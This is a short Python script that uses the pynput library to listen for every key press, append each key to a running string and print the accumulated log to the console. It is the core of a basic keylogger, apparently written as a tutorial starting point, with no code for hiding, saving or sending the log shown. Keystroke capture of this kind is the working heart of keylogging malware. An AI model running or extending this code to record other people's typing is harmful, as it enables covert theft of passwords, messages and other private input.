#!/usr/bin/env python

import pynput.keyboard
logger = ""

def process_key_press(key):
    global logger
    logger = logger + str(key)
    print(logger)

keyboard_listener = pynput.keyboard.Listener(on_press = process_key_press)
with keyboard_listener:
    keyboard_listener.join()
